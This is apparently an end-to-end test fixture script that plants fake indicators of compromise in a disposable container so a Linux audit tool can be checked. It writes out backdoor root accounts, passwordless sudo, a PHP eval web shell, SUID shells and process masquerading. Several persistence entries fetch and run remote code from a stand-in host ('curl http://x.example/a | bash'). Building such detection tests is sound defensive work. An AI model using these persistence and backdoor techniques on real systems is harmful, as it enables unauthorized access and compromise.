#!/bin/sh
# Plants fake indicators of compromise inside a disposable test container.
# NEVER run this on a real host: it creates a UID 0 account and SUID shells.
set -u
umask 022
if [ ! -f /etc/ubuntu-sys-audit-e2e ]; then
	echo "refusing to run: /etc/ubuntu-sys-audit-e2e is missing, this does not look like the test container" >&2
	exit 1
fi
# Docker mounts these noexec; the fixtures below need to run from them.
mount -o remount,exec /dev/shm 2>/dev/null
mount -o remount,exec /tmp 2>/dev/null

# --- not an indicator: replace udevadm the way dpkg does during an upgrade, so
# the running udevd now shows a deleted binary. This must not read as masquerade.
udevadm=$(command -v udevadm)
cp -p "$udevadm" "$udevadm.new" && mv "$udevadm.new" "$udevadm"
# The same for a service holding a port: stale, but not malware.
cp -p /usr/sbin/nginx /usr/sbin/nginx.new && mv /usr/sbin/nginx.new /usr/sbin/nginx

# --- accounts
echo 'backdoor:x:0:0::/root:/bin/bash' >>/etc/passwd
echo 'backdoor:$6$saltsalt$AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:20000:0:99999:7:::' >>/etc/shadow
useradd -m nopass 2>/dev/null
sed -i 's/^nopass:[^:]*:/nopass::/' /etc/shadow
usermod -s /bin/bash www-data
echo 'ghost::1500:1500::/tmp:/bin/bash' >>/etc/passwd
echo 'inlinehash:$6$saltsalt$AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:1501:1501::/tmp:/bin/bash' >>/etc/passwd
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >/etc/sudoers.d/web
chmod 440 /etc/sudoers.d/web

# --- hostile files a root scan must not trip over
useradd -m bob 2>/dev/null
rm -f /home/bob/.bashrc /home/bob/.profile
ln -s /etc/shadow /home/bob/.bashrc
mkfifo /home/bob/.profile
ln -s /dev/null /home/bob/.bash_history
mkdir -p /home/bob/.ssh
ln -s /etc/shadow /home/bob/.ssh/authorized_keys

# --- ssh
# Spelled with "=", which sshd accepts and a naive parser reads as unset.
rm -f /etc/ssh/sshd_config.d/*
{ printf 'PermitRootLogin = yes\nPasswordAuthentication = yes\n'; cat /etc/ssh/sshd_config; } >/tmp/sshd_config.new
cat /tmp/sshd_config.new >/etc/ssh/sshd_config
mkdir -p /var/www/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGZha2VrZXlmb3JlbmR0b2VuZHRlc3RmaXh0dXJlMDAwMDA= e2e-attacker@evil' >/var/www/.ssh/authorized_keys

# --- persistence
echo '* * * * * root curl -fsSL http://x.example/a.sh | bash' >/etc/cron.d/backdoor
printf '[Service]\nExecStart=/tmp/.x/run\n[Install]\nWantedBy=multi-user.target\n' >/etc/systemd/system/update-check.service
echo '/usr/lib/libfake-not-there.so' >/etc/ld.so.preload
echo 'auth optional /opt/evil/pam_evil.so' >>/etc/pam.d/su
# Hidden behind symlinks, which a scan that skips links would never see.
mkdir -p /var/tmp/p
echo 'curl -fsSL http://x.example/a | bash' >/var/tmp/p/rc
rm -f /root/.bashrc
ln -s /var/tmp/p/rc /root/.bashrc
printf '[Service]\nExecStart=/tmp/.x/run\n' >/var/tmp/p/linked.service
ln -s /var/tmp/p/linked.service /etc/systemd/system/linked.service
# Fake credentials in the forms people really use. None may reach a report.
mkdir -p /var/spool/cron/crontabs
cat >/var/spool/cron/crontabs/root <<'CRON'
0 1 1 1 * mysqldump -uroot -pS3CRET1 db
0 2 1 1 * PGPASSWORD=S3CRET2 pg_dump x
0 3 1 1 * curl -u a:S3CRET3 http://x.example/
0 4 1 1 * curl -H "Authorization: Bearer S3CRET4" http://x.example/
CRON
chmod 600 /var/spool/cron/crontabs/root
echo 'deb https://user:S3CRET5@mirror.example.com/ubuntu noble main' >/etc/apt/sources.list.d/creds.list
# Control characters a compromised host could aim at the operator's terminal.
printf '\033]0;pwn\007evil' >/proc/sys/kernel/hostname

# --- filesystem
mkdir -p /tmp/.x
cp /bin/dash /tmp/.x/sh && chmod 4755 /tmp/.x/sh
chmod u+s /usr/bin/find
if command -v setcap >/dev/null; then
	cp /bin/cat /usr/local/bin/capcat
	setcap cap_setuid+ep /usr/local/bin/capcat
fi
touch "$(printf '/tmp/evil\033[2Jname')" && chmod +x "$(printf '/tmp/evil\033[2Jname')"

# --- systemd. Generators run at boot and on daemon-reload, and nothing here calls
# daemon-reload, so none of these execute.
mkdir -p /etc/systemd/system-generators /usr/local/lib/systemd/system-generators
printf '#!/bin/sh\nexit 0\n' >/etc/systemd/system-generators/e2e-unowned
# The signature is split across lines, as a line by line scan would miss it.
printf '#!/bin/sh\ncurl -fsSL http://x.example/g \\\n  | sh\n' >/usr/local/lib/systemd/system-generators/e2e-malicious
printf '#!/bin/sh\nexit 0\n' >/var/tmp/p/gen
ln -s /var/tmp/p/gen /etc/systemd/system-generators/e2e-linked
ln -s /tmp/e2e-not-there-yet /etc/systemd/system-generators/e2e-dangling
chmod 755 /etc/systemd/system-generators/* /usr/local/lib/systemd/system-generators/* /var/tmp/p/gen
# What a generator would have written. No package can own these.
mkdir -p /run/systemd/generator.late
printf '[Service]\nExecStart=/tmp/.x/generated\n' >/run/systemd/generator.late/e2e-generated.service
printf '[Service]\nExecStart=/opt/e2e-generated-plain\n' >/run/systemd/generator.late/e2e-plain.service

# Real transient units, to test the format systemd writes. The timers are an hour
# away, so the commands never run.
systemd-run --unit=e2e-transient --on-active=1h /bin/true >/dev/null 2>&1
systemd-run --unit=e2e-transient-temp --on-active=1h /var/tmp/p/gen >/dev/null 2>&1

# Exec lines a simple parser would miss.
printf '[Service]\nExecStart=/bin/sh -c "curl -fsSL http://x.example/a \\\n# a comment does not end this\n  | bash"\n' >/etc/systemd/system/e2e-split.service
printf '[Service]\nExecCondition=/dev/shm/.cond\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-condition.service
printf '[Service]\nExecStart = /tmp/.x/spaced\n' >/etc/systemd/system/e2e-spaced.service
printf '[Service]\nExecStart=/bin/true ; "/\\x74mp/.x/chained"\n' >/etc/systemd/system/e2e-chained.service

# Loader variables. The other values are not in a form Redact would mask, so a
# leak of them can only be stopped by reporting the loader variable alone.
printf '[Service]\nEnvironment=APP_CRED=S3CRET6 "LD_PRELOAD=/opt/e2e-evil/hook.so"\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-preload.service
printf 'APP_CRED=S3CRET7\nLD_AUDIT=/opt/e2e-evil/audit.so\n' >/etc/e2e-app.env
printf '[Service]\nEnvironmentFile=-/etc/e2e-app.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envfile.service
printf '[Service]\nEnvironmentFile=/var/tmp/p/app.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envtemp.service
# A link and a FIFO must be refused without being read or stalling the scan.
printf 'LD_PRELOAD=S3CRET8\n' >/root/e2e-secret.env
ln -s /root/e2e-secret.env /etc/e2e-linked.env
printf '[Service]\nEnvironmentFile=/etc/e2e-linked.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envlink.service
mkfifo /etc/e2e-fifo.env
printf '[Service]\nEnvironmentFile=/etc/e2e-fifo.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envfifo.service

# Drop-ins replacing the command of a unit a package ships. Each program: from a
# package, from no package, and from a temp directory.
mkdir -p /etc/systemd/system/cron.service.d /etc/systemd/system/nginx.service.d /run/systemd/system/ssh.service.d
printf '[Service]\nExecStart=\nExecStart=/usr/sbin/cron -f -L 15\n' >/etc/systemd/system/cron.service.d/e2e.conf
printf '[Service]\nExecStart=\nExecStart=/opt/e2e-evil/nginx\n' >/etc/systemd/system/nginx.service.d/e2e.conf
printf '[Service]\nExecStart=\nExecStart=/tmp/.x/sh\n' >/run/systemd/system/ssh.service.d/e2e.conf

# A lingering user, whose units run at boot. bob's links must not get a root scan
# to read another user's unit, whichever component of the path is the link.
mkdir -p /var/lib/systemd/linger /home/bob/.config/systemd/user
touch /var/lib/systemd/linger/bob
printf '[Service]\nExecStart=/home/bob/bin/job\n' >/home/bob/.config/systemd/user/e2e-job.service
printf '[Service]\nExecStart=/bin/true S3CRET9\n' >/root/e2e-secret.service
ln -s /root/e2e-secret.service /home/bob/.config/systemd/user/e2e-leak.service
mkdir -p /root/e2e-hidden/share/systemd/user
printf '[Service]\nExecStart=/bin/true S3CRET10\n' >/root/e2e-hidden/share/systemd/user/e2e-hidden.service
ln -s /root/e2e-hidden /home/bob/.local
chown -R -h bob /home/bob/.config /home/bob/.local

# --- other places that run commands. The logs named here do not exist and set
# missingok, so logrotate never runs these scripts, and nothing in the container
# brings an interface up or starts anacron or a desktop session.
cat >/etc/logrotate.d/e2e-app <<'EOF'
/var/log/e2e-none.log {
    missingok
    postrotate
        curl -fsSL http://x.example/l \
          | sh
    endscript
}
EOF
cat >/etc/logrotate.d/e2e-temp <<'EOF'
/var/log/e2e-none2.log {
    missingok
    compresscmd /dev/shm/.z
    postrotate
        /tmp/.x/rotate
    endscript
}
EOF
# A log kept in /tmp is not a program run from there, and logrotate never reads
# a .dpkg-old backup, so neither may be reported.
printf '/tmp/e2e-app.log {\n    missingok\n}\n' >/etc/logrotate.d/e2e-tmplog
printf '/var/log/e2e-none3.log {\n    missingok\n    postrotate\n        curl -fsSL http://x.example/o | sh\n    endscript\n}\n' >/etc/logrotate.d/e2e-app.dpkg-old
mkdir -p /var/tmp/p/lr
echo '/var/log/e2e-none4.log { missingok }' >/var/tmp/p/lr/x
echo 'include /var/tmp/p/lr' >>/etc/logrotate.conf
mkdir -p /etc/networkd-dispatcher/routable.d /etc/network/if-up.d /etc/dhcp/dhclient-exit-hooks.d
printf '#!/bin/sh\ncurl -fsSL http://x.example/n | sh\n' >/etc/networkd-dispatcher/routable.d/50-e2e
printf '#!/bin/sh\n/sbin/ip route add 10.9.0.0/16 via 10.0.0.1\n' >/etc/network/if-up.d/e2e-routes
printf '/tmp/.x/dh "$reason"\n' >/etc/dhcp/dhclient-exit-hooks.d/e2e
chmod 755 /etc/networkd-dispatcher/routable.d/50-e2e /etc/network/if-up.d/e2e-routes
printf 'SHELL=/bin/sh\n1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n1\t10\te2e.job\t/var/tmp/p/job\n' >/etc/anacrontab
mkdir -p /etc/cron.yearly
printf '#!/bin/sh\n/tmp/.x/yearly\n' >/etc/cron.yearly/e2e
chmod 755 /etc/cron.yearly/e2e
mkdir -p /etc/xdg/autostart
printf '[Desktop Entry]\nType=Application\nName=e2e\nIcon=/tmp/e2e-icon.png\nExec=/tmp/.x/desk\n' >/etc/xdg/autostart/e2e.desktop

# --- Caddy: an old official build, read by the audit but never run by it, with
# the admin API open to the network and directory listing on.
mkdir -p /opt/caddy /etc/caddy /srv/e2e-site
cp /opt/e2e/caddy-e2e /opt/caddy/caddy
cat >/etc/caddy/Caddyfile <<'EOF'
{
	admin 0.0.0.0:2019
}
:8088 {
	root * /srv/e2e-site
	file_server browse
}
EOF
echo '<?php @eval($_POST["x"]); ?>' >/srv/e2e-site/up.php
HOME=/root /opt/caddy/caddy run --config /etc/caddy/Caddyfile >/dev/null 2>&1 &

# --- TLS default certificate: on 443 the only site becomes the default server,
# so a connection to the address without a name gets the domain's certificate.
# 8443 is done right: its default server has a self-signed localhost certificate.
mkdir -p /etc/nginx/ssl
openssl req -x509 -nodes -newkey rsa:2048 -days 30 -subj /CN=shop.e2e-audit.com \
	-addext "subjectAltName=DNS:shop.e2e-audit.com,DNS:www.e2e-audit.com" \
	-keyout /etc/nginx/ssl/shop.key -out /etc/nginx/ssl/shop.crt >/dev/null 2>&1
openssl req -x509 -nodes -newkey rsa:2048 -days 30 -subj /CN=localhost \
	-keyout /etc/nginx/ssl/default_server.key -out /etc/nginx/ssl/default_server.crt >/dev/null 2>&1
cat >/etc/nginx/conf.d/e2e-tls.conf <<'EOF'
server {
	listen 443 ssl;
	server_name shop.e2e-audit.com;
	ssl_certificate /etc/nginx/ssl/shop.crt;
	ssl_certificate_key /etc/nginx/ssl/shop.key;
	return 200;
}
server {
	listen 8443 ssl default_server;
	server_name _;
	ssl_certificate /etc/nginx/ssl/default_server.crt;
	ssl_certificate_key /etc/nginx/ssl/default_server.key;
	return 444;
}
server {
	listen 8443 ssl;
	server_name shop.e2e-audit.com;
	ssl_certificate /etc/nginx/ssl/shop.crt;
	ssl_certificate_key /etc/nginx/ssl/shop.key;
	return 200;
}
EOF
kill -HUP "$(cat /run/nginx.pid)"
sleep 1

# --- trojaned binary: changes content, keeps the package's path
if [ -x /usr/bin/who ]; then
	printf '\n#trojan' >>/usr/bin/who
fi
# /bin/login is at /usr/bin/login on merged systems, and really in /bin on 18.04.
printf '\n#trojan' >>/bin/login
# Replaced by a link, and removed: neither leaves a file to hash.
rm -f /usr/bin/passwd /usr/bin/chage
ln -s /tmp/.x/sh /usr/bin/passwd

# --- web
mkdir -p /var/www/html/uploads
echo '<?php @eval($_POST["x"]); ?>' >/var/www/html/uploads/shell.php
echo '<?php echo "fine"; ?>' >/var/www/html/index.php
echo 'x' >/var/www/html/logo.php.jpg
# A release linked out of the web root, as deploy tools do.
mkdir -p /data/www2
echo '<?php @eval($_POST["x"]); ?>' >/data/www2/hidden.php
ln -s /data/www2 /var/www/html/current
# A FIFO where the nginx check looks. It must not stall the scan.
mkdir -p /opt/stall/sbin
mkfifo /opt/stall/sbin/nginx
mkdir -p /usr/local/nginx/sbin
# A fake "self compiled" nginx: if the audit ever executed it, the sentinel
# file would appear and the end to end check would fail.
cat >/usr/local/nginx/sbin/nginx <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# nginx version: nginx/1.24.0
EOF
chmod +x /usr/local/nginx/sbin/nginx
mkdir -p /usr/local/php8/bin
cat >/usr/local/php8/bin/php <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# X-Powered-By: PHP/7.4.3
EOF
chmod +x /usr/local/php8/bin/php

# --- LXD: an old snap, and a privileged container. There is no real snap here,
# only the files the audit reads, since snapd does not run in this container.
mkdir -p /snap/lxd/current/meta
printf 'name: lxd\nversion: 5.21.1-aaaaaaa\n' >/snap/lxd/current/meta/snap.yaml
mkdir -p /var/snap/lxd/common/lxd/storage-pools/default/containers/priv1
printf 'container:\n  config:\n    security.privileged: "true"\n' >/var/snap/lxd/common/lxd/storage-pools/default/containers/priv1/backup.yaml

# --- firewall: ufw looks enabled, but lets everything in and ignores IPv6, and a
# container publishes a port around it. Only the files the audit reads exist here.
mkdir -p /etc/ufw /etc/default
echo 'ENABLED=yes' >/etc/ufw/ufw.conf
printf 'DEFAULT_INPUT_POLICY="ACCEPT"\nIPV6=no\n' >/etc/default/ufw
sysctl -qw net.ipv6.conf.all.disable_ipv6=0 net.ipv6.conf.eth0.disable_ipv6=0 2>/dev/null
ip -6 addr add 2001:db8::1/64 dev eth0 2>/dev/null
for c in web1 stopped1 hostnet1; do mkdir -p "/var/lib/docker/containers/$c"; done
cat >/var/lib/docker/containers/web1/config.v2.json <<'EOF'
{"Name":"/web1","Config":{"Image":"redis:7"},"State":{"Running":true},
 "NetworkSettings":{"Ports":{"6379/tcp":[{"HostIp":"0.0.0.0","HostPort":"6379"}],"8080/tcp":[{"HostIp":"127.0.0.1","HostPort":"8080"}],"9000/tcp":null}}}
EOF
echo '{"NetworkMode":"bridge"}' >/var/lib/docker/containers/web1/hostconfig.json
# Neither of these has a port rule in effect, so neither may be reported.
echo '{"Name":"/stopped1","Config":{"Image":"x"},"State":{"Running":false}}' >/var/lib/docker/containers/stopped1/config.v2.json
echo '{"NetworkMode":"bridge","PortBindings":{"5555/tcp":[{"HostIp":"","HostPort":"5555"}]}}' >/var/lib/docker/containers/stopped1/hostconfig.json
echo '{"Name":"/hostnet1","Config":{"Image":"x"},"State":{"Running":true}}' >/var/lib/docker/containers/hostnet1/config.v2.json
echo '{"NetworkMode":"host","PortBindings":{"5556/tcp":[{"HostIp":"","HostPort":"5556"}]}}' >/var/lib/docker/containers/hostnet1/hostconfig.json

# --- rarely used protocols: the module list a real kernel would have. tipc is
# blocked, and modprobe ignores files with no .conf suffix, so sctp is not.
kernel_dir="/lib/modules/$(uname -r)"
mkdir -p "$kernel_dir" /etc/modprobe.d
printf 'kernel/net/rds/rds.ko.zst:\nkernel/net/sctp/sctp.ko.zst:\nkernel/net/tipc/tipc.ko.zst:\n' >"$kernel_dir/modules.dep"
echo 'install tipc /bin/false' >/etc/modprobe.d/90-e2e.conf
echo 'blacklist sctp' >/etc/modprobe.d/e2e-no-suffix

# --- name resolution
echo '203.0.113.5 security.ubuntu.com archive.ubuntu.com' >>/etc/hosts
echo '10.0.0.5 ports.ubuntu.com' >>/etc/hosts
# A library that belongs to no package, and a module glibc cannot use, so this
# changes nothing for other programs in the container.
touch /usr/lib/libnss_evilnss.so.2
sed -i 's/^hosts:.*/hosts: files evilnss missingnss [NOTFOUND=return] dns/' /etc/nsswitch.conf
echo 'sshd: ALL: spawn /bin/sh -c "curl http://x.example/a | sh"' >>/etc/hosts.allow

# --- exposed services the listener check should name
python3 -c 'import socket,time
t=socket.socket(); t.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); t.bind(("0.0.0.0",2379)); t.listen()
u=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); u.bind(("0.0.0.0",161))
time.sleep(86400)' >/dev/null 2>&1 &

# --- a tunnel held by a program in a temp directory
cp /opt/e2e/fakeimplant /var/tmp/vpn
/var/tmp/vpn tunnel >/dev/null 2>&1 &
sleep 1
ip link set e2etun0 up 2>/dev/null

# --- processes
# A symlink made by an attacker gives argv[0] a path that resolves to the running
# binary. Unlike udevd's, this one belongs to no package and must still be caught.
# /bin/dash because 18.04 has no merged /usr, so /usr/bin/dash does not exist there.
ln -s /bin/dash /usr/sbin/auditd
bash -c 'exec -a /usr/sbin/auditd /bin/dash -c "sleep 86400; :"' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /dev/shm/.udevd
chmod +x /dev/shm/.udevd
bash -c 'exec -a "/sbin/udevd -d" /dev/shm/.udevd self-delete' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /tmp/.x/rs
/tmp/.x/rs shell-target >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/kw
bash -c 'exec -a "[kworker/0:7]" /var/tmp/kw idle' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/backup
bash -c 'exec -a "backup --password=hunter2" /var/tmp/backup idle' >/dev/null 2>&1 &
sleep 1
echo planted
